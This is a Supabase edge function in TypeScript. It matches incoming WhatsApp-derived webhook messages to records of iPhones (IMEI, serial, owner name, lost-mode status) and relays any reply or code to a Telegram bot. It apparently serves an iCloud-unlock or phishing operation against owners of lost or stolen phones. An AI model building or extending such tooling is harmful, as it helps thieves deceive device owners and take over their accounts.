
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log('Webhook received:', req.method);
    
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )

    // Parse the incoming webhook data from IFTTT
    const body = await req.json();
    console.log('Webhook body:', body);

    const { value1: message, value2: trackingId, value3: processInfo } = body;

    if (!message || !trackingId) {
      console.log('Missing required fields');
      return new Response(
        JSON.stringify({ error: 'Missing message or tracking ID' }),
        { 
          status: 400, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        }
      );
    }

    // Extract phone number from the message (looking for pattern like +52 991 106 8681)
    const phoneMatch = message.match(/\+(\d{1,3})\s?(\d[\d\s]+)/);
    
    if (!phoneMatch) {
      console.log('No phone number found in message');
      return new Response(
        JSON.stringify({ error: 'Phone number not found in message' }),
        { 
          status: 400, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        }
      );
    }

    const countryCode = `+${phoneMatch[1]}`;
    const phoneNumber = phoneMatch[2].replace(/\s/g, '');
    
    console.log('Extracted phone:', countryCode, phoneNumber);

    // Find the process that matches this phone number
    const { data: processes, error: processError } = await supabase
      .from('processes')
      .select('*, profiles!inner(email)')
      .eq('country_code', countryCode)
      .eq('phone_number', phoneNumber)
      .order('created_at', { ascending: false })
      .limit(1);

    if (processError) {
      console.error('Error finding process:', processError);
      return new Response(
        JSON.stringify({ error: 'Database error' }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        }
      );
    }

    if (!processes || processes.length === 0) {
      console.log('No process found for phone number');
      return new Response(
        JSON.stringify({ error: 'Process not found' }),
        { 
          status: 404, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        }
      );
    }

    const process = processes[0];
    console.log('Found process:', process.id);

    // Get user's personal Telegram bot configuration
    const { data: botConfig, error: botError } = await supabase
      .from('telegram_bots')
      .select('*')
      .eq('user_id', process.user_id)
      .eq('is_active', true)
      .single();

    if (botError || !botConfig) {
      console.log('No active bot configuration found for user');
      return new Response(
        JSON.stringify({ error: 'Bot configuration not found' }),
        { 
          status: 404, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        }
      );
    }

    // Create enhanced message for personal bot
    const personalMessage = `🔔 *Alerta de proceso de whatsapp...*

👩🏽‍💻 *Server Astro*

📊 *INFORMACIÓN DEL PROCESO:*
👤 *Cliente:* ${process.client_name}
📱 *Modelo:* ${process.iphone_model}
📞 *IMEI:* ${process.imei}
🔢 *Serie:* ${process.serial_number}
${process.owner_name ? `👥 *Propietario:* ${process.owner_name}` : ''}

📞 *Remitente:* ${countryCode} ${phoneNumber}
📥 *Respuesta o código:* ${trackingId}
${process.lost_mode ? '🔒 *Modo perdido:* Activado' : ''}

🤖 *Bot Astro online* 🟢`;

    console.log('Sending to personal bot:', botConfig.chat_id);

    // Send to user's personal Telegram bot
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botConfig.bot_token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: botConfig.chat_id,
        text: personalMessage,
        parse_mode: 'Markdown'
      }),
    });

    const telegramResult = await telegramResponse.json();
    console.log('Telegram API response:', telegramResult);

    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramResult);
      return new Response(
        JSON.stringify({ error: 'Failed to send to Telegram' }),
        { 
          status: 500, 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        }
      );
    }

    console.log('Message sent successfully to personal bot');

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: 'Notification sent to personal bot',
        processId: process.id
      }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      }
    );

  } catch (error) {
    console.error('Webhook error:', error);
    return new Response(
      JSON.stringify({ error: 'Internal server error' }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      }
    );
  }
});
